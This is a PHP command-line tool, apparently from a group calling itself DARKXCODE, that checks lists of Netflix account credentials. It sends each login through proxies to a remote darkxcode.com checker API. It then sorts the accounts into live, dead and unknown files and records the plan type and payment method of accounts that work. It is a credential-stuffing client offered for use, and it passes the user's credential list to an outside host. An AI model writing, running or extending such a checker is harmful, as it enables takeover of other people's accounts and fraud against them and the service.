<?php
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : NETFLIX ACCOUNT CHECKER
 * VERSION  : V1
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */

require_once "function/function.php";
require_once "function/settings.php";

echo banner();
echo banner2();
enterlist:
echo "\n\n [$BL+$WH]$BL Enter your list $WH($DEF eg:$YL list.txt$WH )$GR >> $WH";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
 echo " [!] Your Fucking list not found [!]".PHP_EOL;
 goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

echo " [$BL+$WH]$BL Enter your apikey $GR >> $WH";
$apikey = trim(fgets(STDIN));


$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$no = 0;
echo PHP_EOL.PHP_EOL;
foreach ($lists as $list) {
    $no++;

    $api = "https://darkxcode.com/checker/netflix-checker/?list=$list&apikey=$apikey&proxy=$Proxies&proxyPWD=$proxy_pwd";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_USERAGENT, "CURL/COMMAND LINE");
    $x = curl_exec($ch);
    curl_close($ch);
    $js  = json_decode($x, TRUE);
    $msg           = $js['data']['info']['msg'];
    $CRE           = $js['data']['info']['credit_ball'];
    $type_acc      = $js['data']['info']['type_acc'];
    $payment_acc   = $js['data']['info']['payment_acc'];
    $domain        = $js['data']['info']['domain'];

    if(strpos($x, '"status":"success"')){
        $live++;
        save_file("result/live.txt","$list | $domain | $type_acc | $payment_acc | $msg");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $list$DEF | [$YL CRE$DEF: $MG$CRE$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | [$YL TYPE$DEF: $MG$type_acc$DEF ] | [$YL PAYMENT$DEF: $MG$payment_acc$DEF ] | [$YL DOMAIN$DEF: $MG$domain$DEF ] | BY$CY DARKXCODE$DEF(V1)".PHP_EOL;
    }else if (strpos($x, '"status":"failed"')){
        $die++;
        save_file("result/die.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $list$DEF |  [$YL CRE$DEF: $MG$CRE$DEF ] | [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF(V1)".PHP_EOL;
    }else{
        $unknown++;
        save_file("result/unknown.txt","$list");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $list$DEF | BY$CY DARKXCODE$DEF(V1)".PHP_EOL;
        //echo $x.PHP_EOL.PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================".PHP_EOL;
echo " DATE          : ".$date.PHP_EOL;
echo " LIVE          : ".$live.PHP_EOL;
echo " DIE           : ".$die.PHP_EOL;
echo " UNKNOWN       : ".$unknown.PHP_EOL;
echo " TOTAL         : ".$total.PHP_EOL;
echo "======================================".PHP_EOL;
echo "[+] RATIO SUCCESS LOGIN => $GR".round(RatioCheck($live, $total))."%$DEF".PHP_EOL.PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' [!]".PHP_EOL;
echo "This file '".$listname."'".PHP_EOL;
echo "File saved in folder 'result/' ".PHP_EOL.PHP_EOL;


// ==========> FUNCTION

function collorLine($col){
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
?>